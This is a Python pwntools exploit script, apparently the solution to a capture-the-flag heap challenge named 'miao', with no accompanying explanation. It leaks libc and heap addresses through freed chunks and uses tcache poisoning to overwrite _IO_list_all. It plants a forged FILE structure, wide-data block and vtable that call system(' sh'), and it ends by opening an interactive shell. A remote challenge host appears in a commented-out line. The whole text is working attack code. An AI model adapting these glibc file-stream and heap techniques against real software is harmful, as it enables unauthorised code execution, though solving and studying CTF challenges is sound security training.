from pwn import *

io = process("./miao")
#io = remote("challenge.xiaoyuyc.com", 47780)
libc = ELF("./libc.so.6")
elf = ELF("./miao")

context.log_level = "debug"


def select(id: int):
    io.recvuntil(b">> ")
    io.sendline(str(id).encode())


def add(size: int, content: bytes):
    select(1)
    io.recvuntil(b"Size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"Content: ")
    io.send(content)


def delete(idx: int):
    select(2)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())


def show(idx: int):
    select(3)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())


def edit(idx: int, content: bytes):
    select(4)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Content: ")
    io.send(content)


add(0x450, b"0000")  # 0
add(0x20, b"1111")  # 1
delete(0)
show(0)
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x21ACE0
print(b"libc base =", hex(libc_base))

environ = libc.sym["_environ"] + libc_base
stderr = libc_base + libc.sym["_IO_2_1_stderr_"]
io_list_all = libc_base + libc.sym["_IO_list_all"]
print("environ address =", hex(environ))

add(0xFF, b"2222")  # 2
delete(2)
show(2)
heap_xor = u64(io.recvuntil(b"\x05")[-5:].ljust(8, b"\x00"))
print("heap =", hex(heap_xor))

fake_file_addr = (heap_xor << 12) + 0x2A0
print("fake_file address =", hex(fake_file_addr))
fake_wide_addr = (heap_xor << 12) + 0x3b0
print("fake_wide address =", hex(fake_wide_addr))
fake_vtable_addr = (heap_xor << 12) + 0x4b0
print("fake_vtable address =", hex(fake_vtable_addr))
fake_file = flat(
    {
        0x00: b" sh\x00",
        0x28: p64(1),
        0x88: p64(fake_file_addr),
        0xA0: p64(fake_wide_addr),
        0xD8: p64(libc_base + libc.sym["_IO_wfile_jumps"]),
    },
    filler=b"\x00",
)

fake_wide = flat(
    {0x18: p64(0), 0x30: p64(0), 0xE0: p64(fake_vtable_addr)}, filler=b"\x00"
)

fake_vtable = flat({0x68: p64(libc_base + libc.symbols["system"])}, filler=b"\x00")

add(0x100, fake_file)  # 3
add(0xf0, fake_wide) # 4
add(0x80, fake_vtable) # 5

add(0x30, b"666") # 6
add(0x30, b"7777") # 7

delete(6)
delete(7)

store_io_list_all = heap_xor ^ io_list_all

edit(7, p64(store_io_list_all))
add(0x30, b"1")
add(0x30, p64(fake_file_addr))

io.sendline(b"5")

io.interactive()
